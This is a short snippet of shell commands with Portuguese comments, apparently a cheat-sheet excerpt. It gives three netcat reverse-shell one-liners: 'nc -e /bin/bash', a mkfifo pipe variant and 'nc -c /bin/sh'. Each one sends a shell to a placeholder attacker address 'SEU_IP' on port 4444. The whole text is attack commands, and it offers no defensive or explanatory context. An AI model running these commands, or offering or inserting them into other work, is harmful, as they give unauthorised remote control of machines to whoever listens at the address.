# Versão tradicional
nc -e /bin/bash SEU_IP 4444

# Alternativa sem -e
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc SEU_IP 4444 > /tmp/f

# Versão com netcat tradicional
nc -c /bin/sh SEU_IP 4444
